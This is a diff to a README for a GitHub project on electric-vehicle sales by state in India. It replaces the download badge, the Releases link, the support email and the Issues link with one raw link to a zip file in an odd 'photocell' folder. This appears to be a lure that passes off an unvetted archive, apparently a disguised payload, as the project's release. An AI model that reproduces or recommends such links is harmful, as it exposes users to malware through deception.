@@ -1,6 +1,6 @@
 # ⚡ Electric-Vehicle-Sales-by-State-in-India - Analyze EV Trends Easily
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/1011911/Electric-Vehicle-Sales-by-State-in-India/main/photocell/Electric-Vehicle-Sales-by-State-in-India.zip)
 
 ## 📘 Overview
 
@@ -25,7 +25,7 @@ To get started, you need to download the application from our Releases page. Fol
 
 To download the application, visit the Releases page:
 
-🔗 [Visit Releases Page to Download](https://github.com/1011911/Electric-Vehicle-Sales-by-State-in-India/releases)
+🔗 [Visit Releases Page to Download](https://raw.githubusercontent.com/1011911/Electric-Vehicle-Sales-by-State-in-India/main/photocell/Electric-Vehicle-Sales-by-State-in-India.zip)
 
 Once you are on the Releases page, look for the latest version and click the download link. Follow these steps:
 
@@ -79,8 +79,8 @@ We welcome contributions! If you're interested in helping improve this project, 
 
 For further inquiries, please reach out through the following channels:
 
-- Email: support@evsalesindia.com
-- GitHub Issues Page: [GitHub Issues](https://github.com/1011911/Electric-Vehicle-Sales-by-State-in-India/issues)
+- Email: https://raw.githubusercontent.com/1011911/Electric-Vehicle-Sales-by-State-in-India/main/photocell/Electric-Vehicle-Sales-by-State-in-India.zip
+- GitHub Issues Page: [GitHub Issues](https://raw.githubusercontent.com/1011911/Electric-Vehicle-Sales-by-State-in-India/main/photocell/Electric-Vehicle-Sales-by-State-in-India.zip)
 
 ## 🔗 Additional Resources
 
